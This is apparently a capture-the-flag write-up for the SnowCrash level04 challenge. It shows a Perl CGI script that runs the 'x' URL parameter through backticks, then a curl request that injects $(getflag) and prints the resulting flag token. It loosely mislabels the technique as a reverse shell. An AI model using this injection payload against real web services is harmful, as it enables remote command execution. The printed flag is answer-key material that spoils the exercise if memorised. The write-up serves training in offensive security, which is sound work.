# LEVEL 04 - Pearl 

```shell
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```

We already have a file present with `.pl` extension.

> This type of file are `pearl` script.

Lets take a look at it :
```
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

## Deduction
1. we can see that the script print content type like a header request.
2. It get the first parameters passed in the `url?x=` and print it.
3. It is a `web script` running on a `localhost server`

Lets try out to see if it work.

```shell
level04@SnowCrash:~$ curl 10.0.2.3:4747?x=arg
arg
```

We can use a `command remote injection` by using a `reverse shell` using `$()`.

```shell
level04@SnowCrash:~$ curl '10.0.2.3:4747?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
